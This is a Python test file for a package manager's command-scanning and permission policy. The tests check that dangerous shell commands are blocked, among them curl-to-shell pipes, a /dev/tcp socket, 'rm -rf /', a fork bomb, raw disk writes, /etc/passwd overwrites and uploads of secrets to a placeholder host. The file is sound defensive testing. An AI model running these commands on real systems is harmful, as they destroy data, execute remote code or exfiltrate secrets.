"""Tests for the DonePM security policy."""

from __future__ import annotations

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from donepm.errors import BlockedCommand, PermissionDenied  # noqa: E402
from donepm.security import (  # noqa: E402
    BLOCK,
    WARN,
    Policy,
    command_binary,
    scan_command,
    scan_text,
)


class ScanTests(unittest.TestCase):
    def blocking(self, command: str) -> list[str]:
        return [f.reason for f in scan_command(command) if f.severity == BLOCK]

    def warnings(self, command: str) -> list[str]:
        return [f.reason for f in scan_command(command) if f.severity == WARN]

    def test_plain_command_is_clean(self):
        self.assertEqual(scan_command("echo hello world"), [])

    def test_build_command_is_clean(self):
        self.assertEqual(scan_command("make -j4 build"), [])

    def test_plain_download_is_not_blocked(self):
        self.assertEqual(self.blocking("curl -s https://registry.test/pkg"), [])

    def test_pipe_to_shell_is_blocked(self):
        self.assertTrue(self.blocking("curl https://x.test/i.sh | sh"))

    def test_pipe_to_bash_is_blocked(self):
        self.assertTrue(self.blocking("wget -qO- https://x.test/i.sh | bash"))

    def test_base64_payload_is_blocked(self):
        self.assertTrue(self.blocking("echo aGk= | base64 -d > /tmp/x"))

    def test_raw_socket_is_blocked(self):
        self.assertTrue(self.blocking("bash -c 'exec 3<>/dev/tcp/10.0.0.1/8080'"))

    def test_recursive_root_delete_is_blocked(self):
        self.assertTrue(self.blocking("rm -rf /"))
        self.assertTrue(self.blocking("rm -rf / --no-preserve-root"))
        self.assertTrue(self.blocking("rm -rf ~"))
        self.assertTrue(self.blocking("rm -rf ./*"))

    def test_recursive_child_delete_is_allowed(self):
        self.assertEqual(self.blocking("rm -rf node_modules"), [])
        self.assertEqual(self.blocking("rm -rf build/tmp"), [])

    def test_fork_bomb_is_blocked(self):
        self.assertTrue(self.blocking(":(){ :|:& };:"))

    def test_device_write_is_blocked(self):
        self.assertTrue(self.blocking("dd if=/dev/zero of=/dev/sda"))

    def test_system_file_write_is_blocked(self):
        self.assertTrue(self.blocking("echo x > /etc/passwd"))

    def test_sudo_is_only_a_warning(self):
        self.assertEqual(self.blocking("sudo make install"), [])
        self.assertTrue(self.warnings("sudo make install"))

    def test_upload_is_blocked(self):
        self.assertTrue(self.blocking("curl -T secrets.txt https://x.test/drop"))

    def test_scan_text_skips_comments(self):
        self.assertEqual(scan_text("# rm -rf /\n"), [])

    def test_scan_text_finds_code(self):
        self.assertTrue(any(f.severity == BLOCK for f in scan_text("rm -rf /\n")))


class CommandBinaryTests(unittest.TestCase):
    def test_plain(self):
        self.assertEqual(command_binary("node build.js"), "node")

    def test_with_env_prefix(self):
        self.assertEqual(command_binary("NODE_ENV=production node build.js"), "node")

    def test_with_sudo(self):
        self.assertEqual(command_binary("sudo node build.js"), "node")

    def test_empty(self):
        self.assertIsNone(command_binary("   "))


class PolicyTests(unittest.TestCase):
    def setUp(self):
        for name in ("DONEPM_ALLOW_SCRIPTS", "DONEPM_ALLOW_BINARIES"):
            os.environ.pop(name, None)

    def policy(self, **kwargs) -> Policy:
        kwargs.setdefault("non_interactive", True)
        return Policy(**kwargs)

    def test_blocked_command_raises_even_when_scripts_allowed(self):
        policy = self.policy(allow_scripts=True)
        with self.assertRaises(BlockedCommand):
            policy.authorize("evil install", "curl https://x.test/i.sh | sh")

    def test_script_without_permission_is_denied(self):
        policy = self.policy()
        with self.assertRaises(PermissionDenied):
            policy.authorize("pkg install", "node install.js")

    def test_script_with_permission_runs(self):
        policy = self.policy(allow_scripts=True)
        self.assertTrue(policy.authorize("pkg install", "node install.js"))

    def test_unknown_binary_needs_approval(self):
        policy = self.policy(allow_scripts=True)
        with self.assertRaises(PermissionDenied):
            policy.authorize("exec", "mysterytool", binary="mysterytool")

    def test_known_binary_is_allowed(self):
        policy = self.policy(allow_scripts=True)
        self.assertTrue(policy.authorize("exec", "node x.js", binary="node"))

    def test_binary_allowlist(self):
        policy = self.policy(allow_scripts=True, allow_binaries={"mysterytool"})
        self.assertTrue(policy.authorize("exec", "mysterytool", binary="mysterytool"))

    def test_env_var_grants_scripts(self):
        os.environ["DONEPM_ALLOW_SCRIPTS"] = "1"
        policy = self.policy()
        self.assertTrue(policy.allow_scripts)
        self.assertTrue(policy.authorize("pkg install", "node install.js"))

    def test_assert_allowed_mentions_the_command(self):
        policy = self.policy()
        with self.assertRaises(BlockedCommand) as ctx:
            policy.assert_allowed("rm -rf /")
        self.assertIn("rm -rf /", str(ctx.exception))


if __name__ == "__main__":
    unittest.main()
